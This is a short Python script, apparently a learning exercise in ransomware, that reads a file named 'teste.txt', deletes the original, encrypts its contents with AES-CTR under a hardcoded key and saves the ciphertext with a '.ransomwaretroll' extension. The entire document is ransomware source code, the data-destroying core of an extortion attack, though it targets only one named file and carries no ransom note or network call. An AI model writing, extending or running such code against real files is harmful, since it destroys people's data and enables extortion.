import os
import pyaes

#open file crypter

file_name = 'teste.txt'
file = open(file_name,'rb')
file_data = file.read()
file.close()

# remove file original

os.remove(file_name)

# make key crypto

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

#crypto file

crypto_data = aes.encrypt(file_data)

# save file crypt

new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
